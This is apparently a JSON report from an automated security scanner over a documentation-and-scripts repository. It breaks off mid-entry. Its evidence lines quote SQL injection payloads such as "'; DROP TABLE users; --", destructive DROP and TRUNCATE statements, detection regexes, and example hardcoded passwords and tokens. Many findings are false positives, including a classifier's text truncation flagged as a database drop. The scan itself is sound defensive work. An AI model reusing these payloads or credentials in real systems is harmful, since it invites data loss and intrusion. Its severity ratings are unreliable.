{
  "scan_date": "2025-10-28T02:58:24.895486",
  "statistics": {
    "files_scanned": 837,
    "scripts_scanned": 303,
    "lines_scanned": 518576,
    "findings_by_severity": {
      "HIGH": 80,
      "MEDIUM": 1642,
      "CRITICAL": 53,
      "LOW": 0,
      "INFO": 0
    }
  },
  "summary": {
    "total_findings": 1775,
    "critical": 53,
    "high": 80,
    "medium": 1642,
    "low": 0,
    "info": 0
  },
  "findings_by_severity": {
    "HIGH": [
      {
        "severity": "HIGH",
        "category": "Hardcoded Secret",
        "file": "skills/cloud-kubernetes-deployment.md",
        "line_number": 358,
        "issue": "Possible hardcoded password",
        "evidence": "db.password: \"changeme123\"  # Example only - use secret management in production",
        "recommendation": "Use environment variables or secret management"
      },
      {
        "severity": "HIGH",
        "category": "Hardcoded Secret",
        "file": "skills/SECURITY.md",
        "line_number": 43,
        "issue": "Possible hardcoded password",
        "evidence": "password = \"MyRealPassword123\"",
        "recommendation": "Use environment variables or secret management"
      },
      {
        "severity": "HIGH",
        "category": "Hardcoded Secret",
        "file": "skills/SECURITY.md",
        "line_number": 130,
        "issue": "Possible hardcoded password",
        "evidence": "DB_PASSWORD=\"xK9mP2nQ7sL4\"",
        "recommendation": "Use environment variables or secret management"
      },
      {
        "severity": "HIGH",
        "category": "Dangerous Command",
        "file": "skills/workflow/project-synthesis/resources/REFERENCE.md",
        "line_number": 193,
        "issue": "Destructive git operation",
        "evidence": "git reset --hard $BASELINE_COMMIT",
        "recommendation": "Warn about data loss and require confirmation"
      },
      {
        "severity": "HIGH",
        "category": "Dangerous Command",
        "file": "skills/workflow/project-synthesis/resources/REFERENCE.md",
        "line_number": 307,
        "issue": "Destructive git operation",
        "evidence": "2. **REVERT** - `git reset --hard $BASELINE_COMMIT`  <!-- Intentional recovery step -->",
        "recommendation": "Warn about data loss and require confirmation"
      },
      {
        "severity": "HIGH",
        "category": "Hardcoded Secret",
        "file": "skills/api/api-authentication/resources/scripts/README.md",
        "line_number": 173,
        "issue": "Possible hardcoded token",
        "evidence": "TOKEN=\"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...\"  # Test token for security audit only",
        "recommendation": "Use environment variables or secret management"
      },
      {
        "severity": "HIGH",
        "category": "Hardcoded Secret",
        "file": "skills/cloud/aws/aws-databases.md",
        "line_number": 53,
        "issue": "Possible hardcoded password",
        "evidence": "MasterUserPassword='SecurePassword123!',  # Example only - use AWS Secrets Manager in production",
        "recommendation": "Use environment variables or secret management"
      },
      {
        "severity": "HIGH",
        "category": "Hardcoded Secret",
        "file": "skills/cloud/aws/aws-databases.md",
        "line_number": 301,
        "issue": "Possible hardcoded password",
        "evidence": "MasterUserPassword='SecurePassword123!',  # Example only - use AWS Secrets Manager in production",
        "recommendation": "Use environment variables or secret management"
      },
      {
        "severity": "HIGH",
        "category": "Hardcoded Secret",
        "file": "skills/cloud/aws/aws-databases.md",
        "line_number": 375,
        "issue": "Possible hardcoded password",
        "evidence": "Password='migration_password'  # Example only - use AWS Secrets Manager in production",
        "recommendation": "Use environment variables or secret management"
      },
      {
        "severity": "HIGH",
        "category": "Hardcoded Secret",
        "file": "skills/cloud/aws/aws-databases.md",
        "line_number": 387,
        "issue": "Possible hardcoded password",
        "evidence": "Password='SecurePassword123!'  # Example only - use AWS Secrets Manager in production",
        "recommendation": "Use environment variables or secret management"
      },
      {
        "severity": "HIGH",
        "category": "Hardcoded Secret",
        "file": "skills/cloud/aws/aws-databases.md",
        "line_number": 432,
        "issue": "Possible hardcoded password",
        "evidence": "password='SecurePassword123!'  # Example only - use AWS Secrets Manager in production",
        "recommendation": "Use environment variables or secret management"
      },
      {
        "severity": "HIGH",
        "category": "Hardcoded Secret",
        "file": "skills/cloud/gcp/gcp-iam-security.md",
        "line_number": 570,
        "issue": "Possible hardcoded password",
        "evidence": "DATABASE_PASSWORD = \"super_secret_password\"  # Exposed in source control! Example only",
        "recommendation": "Use environment variables or secret management"
      },
      {
        "severity": "HIGH",
        "category": "Dangerous Command",
        "file": "skills/testing/integration-testing/resources/REFERENCE.md",
        "line_number": 1898,
        "issue": "Destructive database operation",
        "evidence": "users = repo.search(\"'; DROP TABLE users; --\")  # Example attack - should be safely handled",
        "recommendation": "Require backup and confirmation before execution"
      },
      {
        "severity": "HIGH",
        "category": "Dangerous Command",
        "file": "skills/testing/e2e-testing/resources/REFERENCE.md",
        "line_number": 1649,
        "issue": "Destructive database operation",
        "evidence": "await pool.query('TRUNCATE users, products, orders CASCADE');",
        "recommendation": "Require backup and confirmation"
      },
      {
        "severity": "HIGH",
        "category": "Hardcoded Secret",
        "file": "skills/protocols/kafka-streams/resources/REFERENCE.md",
        "line_number": 1949,
        "issue": "Possible hardcoded password",
        "evidence": "password=\"admin-secret\"  # Example only - use secure credential management",
        "recommendation": "Use environment variables or secret management"
      },
      {
        "severity": "HIGH",
        "category": "Hardcoded Secret",
        "file": "skills/protocols/kafka-streams/resources/REFERENCE.md",
        "line_number": 1962,
        "issue": "Possible hardcoded password",
        "evidence": "sasl_plain_password='alice-secret'  # Example only - use environment variable or secret manager",
        "recommendation": "Use environment variables or secret management"
      },
      {
        "severity": "HIGH",
        "category": "Hardcoded Secret",
        "file": "skills/protocols/kafka-streams/resources/REFERENCE.md",
        "line_number": 1974,
        "issue": "Possible hardcoded password",
        "evidence": "sasl_plain_password='alice-secret'  # Example only - use environment variable or secret manager",
        "recommendation": "Use environment variables or secret management"
      },
      {
        "severity": "HIGH",
        "category": "Hardcoded Secret",
        "file": "skills/cryptography/certificate-management.md",
        "line_number": 141,
        "issue": "Possible hardcoded token",
        "evidence": "export CF_Token=\"your-cloudflare-api-token\"  # Placeholder - replace with actual API token from Cloudflare dashboard",
        "recommendation": "Use environment variables or secret management"
      },
      {
        "severity": "HIGH",
        "category": "Hardcoded Secret",
        "file": "skills/cryptography/encryption-at-rest/resources/REFERENCE.md",
        "line_number": 411,
        "issue": "Possible hardcoded password",
        "evidence": "password = \"user-password\"  # Example only - in production, get from secure input",
        "recommendation": "Use environment variables or secret management"
      },
      {
        "severity": "HIGH",
        "category": "Hardcoded Secret",
        "file": "skills/cryptography/certificate-management/resources/REFERENCE.md",
        "line_number": 876,
        "issue": "Possible hardcoded token",
        "evidence": "export CF_Token=\"your-cloudflare-api-token\"  # Placeholder - replace with actual API token from Cloudflare dashboard",
        "recommendation": "Use environment variables or secret management"
      },
      {
        "severity": "HIGH",
        "category": "Hardcoded Secret",
        "file": "skills/cryptography/secrets-rotation/resources/REFERENCE.md",
        "line_number": 992,
        "issue": "Possible hardcoded password",
        "evidence": "password=\"admin_password\"  # Example only - use actual credentials from secure storage",
        "recommendation": "Use environment variables or secret management"
      },
      {
        "severity": "HIGH",
        "category": "Hardcoded Secret",
        "file": "skills/cryptography/secrets-rotation/resources/REFERENCE.md",
        "line_number": 1300,
        "issue": "Possible hardcoded password",
        "evidence": "admin_password='admin_password'  # Example only - use environment variable or secret manager",
        "recommendation": "Use environment variables or secret management"
      },
      {
        "severity": "HIGH",
        "category": "Hardcoded Secret",
        "file": "skills/cryptography/secrets-rotation/resources/REFERENCE.md",
        "line_number": 1494,
        "issue": "Possible hardcoded password",
        "evidence": "password='old_password'  # Example only - use environment variable or secret manager",
        "recommendation": "Use environment variables or secret management"
      },
      {
        "severity": "HIGH",
        "category": "Hardcoded Secret",
        "file": "skills/cryptography/secrets-rotation/resources/REFERENCE.md",
        "line_number": 2314,
        "issue": "Possible hardcoded password",
        "evidence": "password: \"my_password_123\"  # Plaintext in config - example only",
        "recommendation": "Use environment variables or secret management"
      },
      {
        "severity": "HIGH",
        "category": "Dangerous Command",
        "file": "skills/ml/custom-llm-evaluation.md",
        "line_number": 302,
        "issue": "Destructive database operation",
        "evidence": "pred = self.toxicity_classifier(text[:512])[0]  # Truncate to model limit",
        "recommendation": "Require backup and confirmation"
      },
      {
        "severity": "HIGH",
        "category": "Hardcoded Secret",
        "file": "skills/security/secrets-management.md",
        "line_number": 41,
        "issue": "Possible hardcoded password",
        "evidence": "DB_PASSWORD = \"MyP@ssw0rd123\"  # Example of what NOT to do",
        "recommendation": "Use environment variables or secret management"
      },
      {
        "severity": "HIGH",
        "category": "Hardcoded Secret",
        "file": "skills/security/secrets-management.md",
        "line_number": 667,
        "issue": "Possible hardcoded password",
        "evidence": "connect(password=\"secret123\")  # Example only - never hardcode passwords",
        "recommendation": "Use environment variables or secret management"
      },
      {
        "severity": "HIGH",
        "category": "Dangerous Command",
        "file": "skills/security/vulnerability-assessment.md",
        "line_number": 126,
        "issue": "Destructive database operation",
        "evidence": "\"'; DROP TABLE users; --\",  # Example of destructive injection payload",
        "recommendation": "Require backup and confirmation before execution"
      },
      {
        "severity": "HIGH",
        "category": "Hardcoded Secret",
        "file": "skills/security/vulnerability-assessment.md",
        "line_number": 389,
        "issue": "Possible hardcoded token",
        "evidence": "expired_token = \"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9...\"  # Test token for security validation only",
        "recommendation": "Use environment variables or secret management"
      },
      {
        "severity": "HIGH",
        "category": "Hardcoded Secret",
        "file": "skills/security/vulnerability-assessment/resources/REFERENCE.md",
        "line_number": 74,
        "issue": "Possible hardcoded password",
        "evidence": "SELECT * FROM users WHERE username = '$username' AND password = '$password'",
        "recommendation": "Use environment variables or secret management"
      },
      {
        "severity": "HIGH",
        "category": "Hardcoded Secret",
        "file": "skills/security/oauth2-implementation/resources/REFERENCE.md",
        "line_number": 2584,
        "issue": "Possible hardcoded token",
        "evidence": "access_token='initial_access_token',  # Placeholder - use actual token from auth response",
        "recommendation": "Use environment variables or secret management"
      },
      {
        "severity": "HIGH",
        "category": "Hardcoded Secret",
        "file": "skills/security/oauth2-implementation/resources/REFERENCE.md",
        "line_number": 2585,
        "issue": "Possible hardcoded token",
        "evidence": "refresh_token='initial_refresh_token',  # Placeholder - use actual token from auth response",
        "recommendation": "Use environment variables or secret management"
      },
      {
        "severity": "HIGH",
        "category": "Dangerous Command",
        "file": "skills/data/etl-patterns.md",
        "line_number": 44,
        "issue": "Destructive database operation",
        "evidence": "\u2192 Pattern: TRUNCATE + INSERT or DROP + CREATE  <!-- ETL operations on target tables -->",
        "recommendation": "Require backup and confirmation"
      },
      {
        "severity": "HIGH",
        "category": "Dangerous Command",
        "file": "skills/data/etl-patterns.md",
        "line_number": 322,
        "issue": "Destructive database operation",
        "evidence": "conn.execute(f\"DROP TABLE {temp_table}\")",
        "recommendation": "Require backup and confirmation before execution"
      },
      {
        "severity": "HIGH",
        "category": "Dangerous Command",
        "file": "skills/data/etl-patterns.md",
        "line_number": 357,
        "issue": "Destructive database operation",
        "evidence": "cursor.execute(f\"DROP TABLE {stage_table}\")",
        "recommendation": "Require backup and confirmation before execution"
      },
      {
        "severity": "HIGH",
        "category": "Dangerous Command",
        "file": "skills/engineering/deployment-strategies/resources/REFERENCE.md",
        "line_number": 1668,
        "issue": "Destructive database operation",
        "evidence": "db.execute(\"TRUNCATE user_preferences\")",
        "recommendation": "Require backup and confirmation"
      },
      {
        "severity": "HIGH",
        "category": "Hardcoded Secret",
        "file": "skills/engineering/monitoring-alerts/resources/REFERENCE.md",
        "line_number": 2017,
        "issue": "Possible hardcoded password",
        "evidence": "auth_password: '${SMTP_PASSWORD}'  # Environment variable - set securely before running",
        "recommendation": "Use environment variables or secret management"
      },
      {
        "severity": "HIGH",
        "category": "Dangerous Command",
        "file": "skills/database/apache-iceberg.md",
        "line_number": 46,
        "issue": "Destructive database operation",
        "evidence": "- Supports transforms (year, month, day, hour, bucket, truncate)  <!-- NOTE: truncate is Iceberg's data transform function, not SQL TRUNCATE -->",
        "recommendation": "Require backup and confirmation"
      },
      {
        "severity": "HIGH",
        "category": "Dangerous Command",
        "file": "skills/database/apache-iceberg.md",
        "line_number": 238,
        "issue": "Destructive database operation",
        "evidence": "TruncateTransform(width=10)       # NOTE: Iceberg transform for trimming strings/numbers to width, not SQL TRUNCATE",
        "recommendation": "Require backup and confirmation"
      },
      {
        "severity": "HIGH",
        "category": "Dangerous Command",
        "file": "skills/database/apache-iceberg.md",
        "line_number": 545,
        "issue": "Destructive database operation",
        "evidence": "truncate(W, str)  | PARTITIONED BY (truncate(10, str)) | String prefixes  <!-- NOTE: Iceberg transform function -->",
        "recommendation": "Require backup and confirmation"
      },
      {
        "severity": "HIGH",
        "category": "Dangerous Command",
        "file": "skills/database/apache-iceberg.md",
        "line_number": 558,
        "issue": "Destructive database operation",
        "evidence": "write.metadata.metrics.default=truncate(16)  # NOTE: Iceberg's truncate transform for metrics, not SQL TRUNCATE",
        "recommendation": "Require backup and confirmation"
      },
      {
        "severity": "HIGH",
        "category": "Dangerous Command",
        "file": "skills/database/postgres-migrations.md",
        "line_number": 94,
        "issue": "Destructive database operation",
        "evidence": "DROP TABLE users;",
        "recommendation": "Require backup and confirmation before execution"
      },
      {
        "severity": "HIGH",
        "category": "Dangerous Command",
        "file": "skills/database/postgres-migrations.md",
        "line_number": 455,
        "issue": "Destructive database operation",
        "evidence": "DROP TABLE IF EXISTS old_logs;",
        "recommendation": "Require backup and confirmation before execution"
      },
      {
        "severity": "HIGH",
        "category": "Dangerous Command",
        "file": "skills/database/postgres-migrations/resources/REFERENCE.md",
        "line_number": 165,
        "issue": "Destructive database operation",
        "evidence": "DROP TABLE users;",
        "recommendation": "Require backup and confirmation before execution"
      },
      {
        "severity": "HIGH",
        "category": "Dangerous Command",
        "file": "skills/database/postgres-migrations/resources/REFERENCE.md",
        "line_number": 582,
        "issue": "Destructive database operation",
        "evidence": "DROP TABLE users;",
        "recommendation": "Require backup and confirmation before execution"
      },
      {
        "severity": "HIGH",
        "category": "Dangerous Command",
        "file": "skills/database/postgres-migrations/resources/REFERENCE.md",
        "line_number": 689,
        "issue": "Destructive database operation",
        "evidence": "DROP TABLE IF EXISTS old_temp_table;",
        "recommendation": "Require backup and confirmation before execution"
      },
      {
        "severity": "HIGH",
        "category": "Dangerous Command",
        "file": "skills/database/postgres-migrations/resources/REFERENCE.md",
        "line_number": 1107,
        "issue": "Destructive database operation",
        "evidence": "| DROP TABLE | AccessExclusiveLock | \u2713 | \u2713 |  <!-- Example of operation impact -->",
        "recommendation": "Require backup and confirmation before execution"
      },
      {
        "severity": "HIGH",
        "category": "Dangerous Command",
        "file": "skills/database/postgres-migrations/resources/REFERENCE.md",
        "line_number": 1498,
        "issue": "Destructive database operation",
        "evidence": "DROP TABLE users; -- \u26a0\ufe0f  Loses data!",
        "recommendation": "Require backup and confirmation before execution"
      },
      {
        "severity": "HIGH",
        "category": "Dangerous Command",
        "file": "skills/database/postgres-migrations/resources/REFERENCE.md",
        "line_number": 1891,
        "issue": "Destructive database operation",
        "evidence": "DROP TABLE events_2023_01;",
        "recommendation": "Require backup and confirmation before execution"
      },
      {
        "severity": "HIGH",
        "category": "Dangerous Command",
        "file": "skills/database/postgres-migrations/resources/examples/docker/README.md",
        "line_number": 191,
        "issue": "Destructive database operation",
        "evidence": "DROP TABLE IF EXISTS orders CASCADE;",
        "recommendation": "Require backup and confirmation before execution"
      },
      {
        "severity": "HIGH",
        "category": "Dangerous Command",
        "file": "skills/database/postgres-migrations/resources/examples/docker/README.md",
        "line_number": 192,
        "issue": "Destructive database operation",
        "evidence": "DROP TABLE IF EXISTS users CASCADE;",
        "recommendation": "Require backup and confirmation before execution"
      },
      {
        "severity": "HIGH",
        "category": "Dangerous Command",
        "file": "skills/formal/smt-theory-applications.md",
        "line_number": 731,
        "issue": "Destructive database operation",
        "evidence": "malicious = String(\"'; DROP TABLE users; --\")",
        "recommendation": "Require backup and confirmation before execution"
      },
      {
        "severity": "HIGH",
        "category": "Dangerous Command",
        "file": "skills/formal/smt-theory-applications.md",
        "line_number": 734,
        "issue": "Destructive database operation",
        "evidence": "s.add(Contains(query, String(\"DROP TABLE\")))",
        "recommendation": "Require backup and confirmation before execution"
      },
      {
        "severity": "HIGH",
        "category": "Hardcoded Secret",
        "file": "skills/proxies/forward-proxy.md",
        "line_number": 544,
        "issue": "Possible hardcoded password",
        "evidence": "password = \"p@ss:word\"  # Example - use actual credentials from environment",
        "recommendation": "Use environment variables or secret management"
      },
      {
        "severity": "HIGH",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/certificate-management/resources/examples/python/mtls_server_client.py",
        "line_number": 173,
        "issue": "shell=True in subprocess",
        "evidence": "# SECURITY: Commands are hardcoded strings (no user input) - safe to use shell=True",
        "recommendation": "Use shell=False and pass command as list"
      },
      {
        "severity": "HIGH",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/certificate-management/resources/examples/python/mtls_server_client.py",
        "line_number": 175,
        "issue": "shell=True in subprocess",
        "evidence": "subprocess.run(cmd, shell=True, check=True)",
        "recommendation": "Use shell=False and pass command as list"
      },
      {
        "severity": "HIGH",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/certificate-management/resources/scripts/renew_certificates.py",
        "line_number": 333,
        "issue": "shell=True in subprocess",
        "evidence": "shell=True,",
        "recommendation": "Use shell=False and pass command as list"
      },
      {
        "severity": "HIGH",
        "category": "SQL Injection Risk",
        "file": "skills/cryptography/secrets-rotation/resources/examples/04_postgresql_zero_downtime_rotation.py",
        "line_number": 146,
        "issue": "Possible SQL injection via f-string",
        "evidence": "cursor.execute(f\"DROP USER IF EXISTS {secondary_user}\")",
        "recommendation": "Use parameterized queries"
      },
      {
        "severity": "HIGH",
        "category": "SQL Injection Risk",
        "file": "skills/cryptography/secrets-rotation/resources/examples/04_postgresql_zero_downtime_rotation.py",
        "line_number": 177,
        "issue": "Possible SQL injection via f-string",
        "evidence": "cursor.execute(f\"GRANT {role} TO {secondary_user}\")",
        "recommendation": "Use parameterized queries"
      },
      {
        "severity": "HIGH",
        "category": "SQL Injection Risk",
        "file": "skills/cryptography/secrets-rotation/resources/examples/04_postgresql_zero_downtime_rotation.py",
        "line_number": 195,
        "issue": "Possible SQL injection via f-string",
        "evidence": "cursor.execute(f\"DROP USER IF EXISTS {username}\")",
        "recommendation": "Use parameterized queries"
      },
      {
        "severity": "HIGH",
        "category": "Dangerous Command",
        "file": "skills/security/vulnerability-assessment/resources/scripts/test_owasp_top10.py",
        "line_number": 199,
        "issue": "Destructive database operation",
        "evidence": "\"'; DROP TABLE users; --\",  # Example of destructive injection payload",
        "recommendation": "Require backup and confirmation before execution"
      },
      {
        "severity": "HIGH",
        "category": "SQL Injection Risk",
        "file": "skills/observability/metrics-instrumentation/resources/scripts/analyze_metrics.py",
        "line_number": 93,
        "issue": "Possible SQL injection via string concatenation",
        "evidence": "result = self.query('{__name__=~\".+\"}')",
        "recommendation": "Use parameterized queries"
      },
      {
        "severity": "HIGH",
        "category": "SQL Injection Risk",
        "file": "skills/observability/metrics-instrumentation/resources/scripts/analyze_metrics.py",
        "line_number": 108,
        "issue": "Possible SQL injection via string concatenation",
        "evidence": "result = self.query('count by (__name__) ({__name__=~\".+\"})')",
        "recommendation": "Use parameterized queries"
      },
      {
        "severity": "HIGH",
        "category": "Command Injection Risk",
        "file": "skills/engineering/code-review/resources/examples/python/automated_review_checks.py",
        "line_number": 297,
        "issue": "exec() usage",
        "evidence": "message=\"Use of 'exec()' is a security risk. \"",
        "recommendation": "Avoid exec() or strictly validate input"
      },
      {
        "severity": "HIGH",
        "category": "Command Injection Risk",
        "file": "skills/engineering/code-review/resources/examples/python/automated_review_checks.py",
        "line_number": 312,
        "issue": "shell=True in subprocess",
        "evidence": "# Check for shell=True in subprocess",
        "recommendation": "Use shell=False and pass command as list"
      },
      {
        "severity": "HIGH",
        "category": "Command Injection Risk",
        "file": "skills/engineering/code-review/resources/examples/python/automated_review_checks.py",
        "line_number": 319,
        "issue": "shell=True in subprocess",
        "evidence": "message=\"subprocess with shell=True is vulnerable to injection. \"",
        "recommendation": "Use shell=False and pass command as list"
      },
      {
        "severity": "HIGH",
        "category": "Command Injection Risk",
        "file": "skills/engineering/code-review/resources/scripts/review_pr.py",
        "line_number": 292,
        "issue": "shell=True in subprocess",
        "evidence": "shell=True,",
        "recommendation": "Use shell=False and pass command as list"
      },
      {
        "severity": "HIGH",
        "category": "Dangerous Command",
        "file": "skills/database/postgres-migrations/resources/scripts/generate_migration.py",
        "line_number": 89,
        "issue": "Destructive database operation",
        "evidence": "drop_sql = f\"DROP TABLE IF EXISTS {table_name};\"",
        "recommendation": "Require backup and confirmation before execution"
      },
      {
        "severity": "HIGH",
        "category": "Dangerous Command",
        "file": "skills/database/postgres-migrations/resources/scripts/analyze_migration.py",
        "line_number": 121,
        "issue": "Destructive database operation",
        "evidence": "(r'\\bDROP\\s+TABLE\\s+(?!IF\\s+EXISTS)', 'DROP TABLE without IF EXISTS'),",
        "recommendation": "Require backup and confirmation before execution"
      },
      {
        "severity": "HIGH",
        "category": "SQL Injection Risk",
        "file": "skills/database/postgres-query-optimization/resources/scripts/analyze_query.py",
        "line_number": 356,
        "issue": "Possible SQL injection via f-string",
        "evidence": "cur.execute(f\"EXPLAIN (ANALYZE, BUFFERS) {args.query}\")",
        "recommendation": "Use parameterized queries"
      },
      {
        "severity": "HIGH",
        "category": "Dangerous Command",
        "file": "skills/distributed-systems/event-sourcing/resources/examples/python/user_projection.py",
        "line_number": 201,
        "issue": "Destructive database operation",
        "evidence": "cursor.execute(f\"TRUNCATE TABLE {self.projection_name}\")",
        "recommendation": "Require backup and confirmation"
      },
      {
        "severity": "HIGH",
        "category": "SQL Injection Risk",
        "file": "skills/distributed-systems/event-sourcing/resources/examples/python/user_projection.py",
        "line_number": 201,
        "issue": "Possible SQL injection via f-string",
        "evidence": "cursor.execute(f\"TRUNCATE TABLE {self.projection_name}\")",
        "recommendation": "Use parameterized queries"
      },
      {
        "severity": "HIGH",
        "category": "SQL Injection Risk",
        "file": "skills/distributed-systems/event-sourcing/resources/scripts/replay_events.py",
        "line_number": 331,
        "issue": "Possible SQL injection via f-string",
        "evidence": "# cursor.execute(f\"TRUNCATE TABLE {self.projection_name}\")",
        "recommendation": "Use parameterized queries"
      },
      {
        "severity": "HIGH",
        "category": "Command Injection Risk",
        "file": "skills/frontend/react-state-management/resources/scripts/detect_unnecessary_renders.js",
        "line_number": 99,
        "issue": "exec() usage",
        "evidence": "// NOTE: .exec() is regex pattern matching, not command execution - no security risk",
        "recommendation": "Avoid exec() or strictly validate input"
      },
      {
        "severity": "HIGH",
        "category": "Command Injection Risk",
        "file": "skills/frontend/react-state-management/resources/scripts/detect_unnecessary_renders.js",
        "line_number": 100,
        "issue": "exec() usage",
        "evidence": "while ((match = functionPattern.exec(content)) !== null) {",
        "recommendation": "Avoid exec() or strictly validate input"
      },
      {
        "severity": "HIGH",
        "category": "Command Injection Risk",
        "file": "skills/frontend/react-state-management/resources/scripts/detect_unnecessary_renders.js",
        "line_number": 111,
        "issue": "exec() usage",
        "evidence": "while ((match = arrowPattern.exec(content)) !== null) {",
        "recommendation": "Avoid exec() or strictly validate input"
      },
      {
        "severity": "HIGH",
        "category": "Command Injection Risk",
        "file": "skills/frontend/react-state-management/resources/scripts/detect_unnecessary_renders.js",
        "line_number": 260,
        "issue": "exec() usage",
        "evidence": "while ((match = useMemoPattern.exec(content)) !== null) {",
        "recommendation": "Avoid exec() or strictly validate input"
      },
      {
        "severity": "HIGH",
        "category": "Command Injection Risk",
        "file": "skills/frontend/react-state-management/resources/scripts/detect_unnecessary_renders.js",
        "line_number": 280,
        "issue": "exec() usage",
        "evidence": "while ((match = useCallbackPattern.exec(content)) !== null) {",
        "recommendation": "Avoid exec() or strictly validate input"
      },
      {
        "severity": "HIGH",
        "category": "Dangerous Command",
        "file": "skills/testing/integration-testing/resources/examples/typescript/test_api_integration.test.ts",
        "line_number": 189,
        "issue": "Destructive database operation",
        "evidence": "await pool.query('DROP TABLE IF EXISTS users');",
        "recommendation": "Require backup and confirmation before execution"
      },
      {
        "severity": "HIGH",
        "category": "Dangerous Command",
        "file": "skills/testing/integration-testing/resources/examples/typescript/test_api_integration.test.ts",
        "line_number": 195,
        "issue": "Destructive database operation",
        "evidence": "await pool.query('TRUNCATE TABLE users RESTART IDENTITY CASCADE');",
        "recommendation": "Require backup and confirmation"
      }
    ],
    "MEDIUM": [
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cloud-kubernetes-deployment.md",
        "line_number": 426,
        "issue": "Unencrypted HTTP",
        "evidence": "kubectl run -it --rm debug --image=curlimages/curl --restart=Never -- curl http://web",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/api/api-authorization.md",
        "line_number": 462,
        "issue": "Unencrypted HTTP",
        "evidence": "\"http://opa:8181/v1/data/app/authz/allow\",",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/api/api-rate-limiting.md",
        "line_number": 1013,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/api/api-authentication/resources/scripts/README.md",
        "line_number": 368,
        "issue": "Path traversal pattern",
        "evidence": "- `../REFERENCE.md` - Detailed JWT/OAuth specifications",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/api/api-authentication/resources/scripts/README.md",
        "line_number": 369,
        "issue": "Path traversal pattern",
        "evidence": "- `../examples/` - Implementation examples",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/api/api-authentication/resources/scripts/README.md",
        "line_number": 370,
        "issue": "Path traversal pattern",
        "evidence": "- Main skill: `../../api-authentication.md`",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cloud/aws-lambda-deployment/resources/REFERENCE.md",
        "line_number": 356,
        "issue": "Unencrypted HTTP",
        "evidence": "curl \"http://${AWS_LAMBDA_RUNTIME_API}/2018-06-01/runtime/invocation/next\"",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cloud/aws-lambda-deployment/resources/REFERENCE.md",
        "line_number": 359,
        "issue": "Unencrypted HTTP",
        "evidence": "curl -X POST \"http://${AWS_LAMBDA_RUNTIME_API}/2018-06-01/runtime/invocation/${RequestId}/response\" \\",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cloud/aws-lambda-deployment/resources/REFERENCE.md",
        "line_number": 363,
        "issue": "Unencrypted HTTP",
        "evidence": "curl -X POST \"http://${AWS_LAMBDA_RUNTIME_API}/2018-06-01/runtime/invocation/${RequestId}/error\" \\",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cloud/aws-lambda-deployment/resources/REFERENCE.md",
        "line_number": 377,
        "issue": "Unencrypted HTTP",
        "evidence": "\"http://${AWS_LAMBDA_RUNTIME_API}/2018-06-01/runtime/invocation/next\")",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cloud/aws-lambda-deployment/resources/REFERENCE.md",
        "line_number": 385,
        "issue": "Unencrypted HTTP",
        "evidence": "curl -sS -X POST \"http://${AWS_LAMBDA_RUNTIME_API}/2018-06-01/runtime/invocation/$REQUEST_ID/response\" \\",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/cloud/aws-lambda-deployment/resources/REFERENCE.md",
        "line_number": 1255,
        "issue": "Path traversal pattern",
        "evidence": "zip -r ../layer.zip .",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/cloud/aws-lambda-deployment/resources/REFERENCE.md",
        "line_number": 3057,
        "issue": "Path traversal pattern",
        "evidence": "zip -r ../layer.zip .",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cloud/aws-lambda-deployment/resources/REFERENCE.md",
        "line_number": 3093,
        "issue": "Unencrypted HTTP",
        "evidence": "\"http://${AWS_LAMBDA_RUNTIME_API}/2020-01-01/extension/register\" \\",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cloud/aws-lambda-deployment/resources/REFERENCE.md",
        "line_number": 3102,
        "issue": "Unencrypted HTTP",
        "evidence": "\"http://${AWS_LAMBDA_RUNTIME_API}/2020-01-01/extension/event/next\" \\",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cloud/aws/aws-api-gateway.md",
        "line_number": 406,
        "issue": "Unencrypted HTTP",
        "evidence": "\"$schema\": \"http://json-schema.org/draft-04/schema#\",",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cloud/aws/aws-ec2-compute.md",
        "line_number": 525,
        "issue": "Unencrypted HTTP",
        "evidence": "METADATA_URL = \"http://169.254.169.254/latest/meta-data/\"",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cloud/aws/aws-ec2-compute.md",
        "line_number": 526,
        "issue": "Unencrypted HTTP",
        "evidence": "TOKEN_URL = \"http://169.254.169.254/latest/api/token\"",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
